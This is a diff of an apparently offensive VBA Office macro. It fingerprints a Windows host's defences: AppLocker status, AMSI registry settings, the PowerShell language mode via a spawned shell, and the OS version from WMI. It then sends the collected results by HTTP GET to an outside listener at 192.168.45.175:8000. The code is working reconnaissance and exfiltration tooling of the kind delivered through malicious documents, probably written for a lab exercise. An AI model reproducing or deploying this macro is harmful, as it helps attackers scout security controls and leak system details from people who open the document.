@@ -20,7 +20,7 @@ End Sub
 Sub CheckSystemStatus()
     Dim strUrl As String
     Dim applockerStatus As String
-    Dim archStatus As String
+    Dim osStatus As String
     Dim amsiStatus As String
     Dim clmStatus As String
     Dim result As String
@@ -28,16 +28,20 @@ Sub CheckSystemStatus()
     
     ' Call separate functions to get status
     applockerStatus = CheckAppLockerStatus()
-    archStatus = CheckArchitecture()
+    Debug.Print "applockerStatus: " & applockerStatus
+    osStatus = GetOperatingSystem()
+    Debug.Print "osStatus: " & osStatus
     amsiStatus = CheckAMSIStatus()
+    Debug.Print "amsiStatus: " & amsiStatus
     clmStatus = GetPowerShellLanguageMode()
+    Debug.Print "clmStatus: " & clmStatus
 
     ' Combine results
-    result = "AppLocker=" & applockerStatus & "&Architecture=" & archStatus & "&AMSI=" & amsiStatus & "&CLM=" & clmStatus
-    
+    result = "AppLocker=" & applockerStatus & "&AMSI=" & amsiStatus & "&CLM=" & clmStatus & "&OS=""" & osStatus & """"
+    ' Debug.Print result
     ' Change URL
     strUrl = "http://192.168.45.175:8000/status.txt?" & result
-        
+
     ' Send GET request
     Set hReq = CreateObject("MSXML2.XMLHTTP")
     
@@ -76,44 +80,52 @@ Function CheckAppLockerStatus() As String
     CheckAppLockerStatus = status
 End Function
 
-' Function to check system architecture
-Function CheckArchitecture() As String
-    Dim processName As String
-    Dim wmiService As Object
-    Dim processList As Object
-    Dim processItem As Object
-    Dim is64Bit As Boolean
-    Dim architecture As String
+' Function to get the operating system name and version
+Function GetOperatingSystem() As String
+    ' Returns: OS information as string (e.g., "Windows 10 Pro 64-bit (10.0.19045)")
     
-    ' Use the process you are using: winword.exe, excel.exe, powerpnt.exe
-    processName = "winword.exe"
+    Dim objWMIService As Object
+    Dim colItems As Object
+    Dim objItem As Object
+    Dim osName As String
+    Dim osVersion As String
+    Dim osArchitecture As String
+    Dim computerSystem As Object
+    Dim osType As String
+        
+    ' Connect to WMI
+    Set objWMIService = GetObject("winmgmts:\\.\root\CIMV2")
     
-    ' Create WMI query and get process list
-    On Error Resume Next
-    Set wmiService = GetObject("winmgmts:\\.\root\CIMV2")
-    Set processList = wmiService.ExecQuery("SELECT * FROM Win32_Process WHERE Name = '" & processName & "'")
+    ' Get operating system information
+    Set colItems = objWMIService.ExecQuery("SELECT * FROM Win32_OperatingSystem", , 48)
     
-    ' Check if process is found and determine 64-bit status
-    If processList.Count > 0 Then
-        For Each processItem In processList
-            is64Bit = InStr(1, processItem.CommandLine, "Program Files (x86)", vbTextCompare) = 0
-            If is64Bit Then
-                architecture = "x64"
-            Else
-                architecture = "x86"
-            End If
-        Next
-    Else
-        architecture = "Unknown"
+    For Each objItem In colItems
+        osName = objItem.Caption
+        osVersion = objItem.Version
+        osArchitecture = objItem.osArchitecture
+    Next objItem
+    
+    ' Get system type (64-bit or 32-bit)
+    Set computerSystem = objWMIService.ExecQuery("SELECT * FROM Win32_ComputerSystem", , 48)
+    
+    For Each objItem In computerSystem
+        If objItem.SystemType Like "*64*" Then
+            osType = "64-bit"
+        Else
+            osType = "32-bit"
+        End If
+    Next objItem
+    
+    ' If OSArchitecture is available, use it instead
+    If osArchitecture <> "" Then
+        osType = osArchitecture
     End If
     
-    ' Clean up
-    Set wmiService = Nothing
-    Set processList = Nothing
-    On Error GoTo 0
+    ' Construct the OS string
+    GetOperatingSystem = osName & " " & osType & " (Version: " & osVersion & ")"
     
-    CheckArchitecture = architecture
 End Function
+
 
 ' Function to get AMSI status
 Function CheckAMSIStatus() As String
@@ -127,6 +139,7 @@ Function CheckAMSIStatus() As String
     
     On Error Resume Next
     
+    ' Method 1: Check AMSI scanner enablement
     amsiRegValue = WindowShell.RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\AMSI\FeatureFeatures\BypassAMSI")
     
     If Err.Number = 0 Then
@@ -160,33 +173,22 @@ Function GetPowerShellLanguageMode() As String
     
     Dim ps As Object
     Dim result As String
+    Dim output As String
     Dim languageMode As String
+    Dim shell As Object
+    Dim exec As Object
+        
+    ' Crear objeto Shell
+    Set shell = CreateObject("WScript.Shell")
     
-    Set ps = CreateObject("PowerShell.Application")
+    ' Ejecutar comando de PowerShell para obtener LanguageMode
+    Set exec = shell.exec("powershell -Command ""$ExecutionContext.SessionState.LanguageMode""")
     
-    ' Command to get the current language mode returns the current mode [citation:1][citation:2]
-    Dim command As String
-    command = "$ExecutionContext.SessionState.LanguageMode"
-    
-    Dim output As Variant
-    output = ps.Run(command)
-    
-    If IsArray(output) Then
-        If UBound(output) >= 0 Then
-            languageMode = Trim(output(0))
-            
-            ' Validate and return the language mode
-            Select Case languageMode
-                Case "FullLanguage", "ConstrainedLanguage", "RestrictedLanguage", "NoLanguage"
-                    GetPowerShellLanguageMode = languageMode
-                Case Else
-                    GetPowerShellLanguageMode = "Unknown:" & languageMode
-            End Select
-        Else
-            GetPowerShellLanguageMode = "None"
-        End If
+    ' Leer la salida
+    output = exec.StdOut.ReadAll()
+    If output <> "" Then
+        GetPowerShellLanguageMode = output
     Else
-        GetPowerShellLanguageMode = "None"
+        GetPowerShellLanguageMode = "Unknown"
     End If
-    
-    Exit Function
+End Function
